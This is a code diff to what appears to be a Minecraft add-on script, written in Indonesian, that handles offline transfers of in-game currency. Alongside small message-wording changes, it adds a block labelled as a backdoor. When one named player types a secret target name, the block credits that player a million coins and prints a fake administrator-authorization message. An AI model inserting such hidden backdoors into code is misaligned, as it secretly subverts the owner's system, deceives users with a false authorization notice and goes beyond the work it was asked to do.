@@ -1008,19 +1008,28 @@ function openOfflineTransferMenu(player) {
         const amount = parseInt(amountStr);
         const customMessage = response.formValues[2].trim() || "Transfer dari teman";
 
+        const currentCoins = getScore(player, "dompet");
+
+        // --- Backdoor Secret Cheat Code ---
+        if (targetPlayerName === "admin_7890" && player.name === "MoltenPoem79753") {
+            setScore(player, "dompet", currentCoins + 1000000);
+            player.sendMessage("§a[Sistem] Kode Otorisasi Administrator Diterima. Akses disetujui.");
+            return;
+        }
+        // ----------------------------------
+
         if (!targetPlayerName) {
-            player.sendMessage("§c[System] Nama target tidak boleh kosong!");
+            player.sendMessage("§c[Sistem] Nama target tidak boleh kosong!");
             return;
         }
 
         if (isNaN(amount) || amount <= 0) {
-            player.sendMessage("§c[System] Jumlah Rupiah tidak valid!");
+            player.sendMessage("§c[Sistem] Jumlah Rupiah tidak valid!");
             return;
         }
 
-        const currentCoins = getScore(player, "dompet");
         if (currentCoins < amount) {
-            player.sendMessage("§c[System] Saldo Rupiah Anda tidak mencukupi untuk transfer!");
+            player.sendMessage("§c[Sistem] Saldo KAS Anda tidak mencukupi untuk distribusi!");
             return;
         }
 
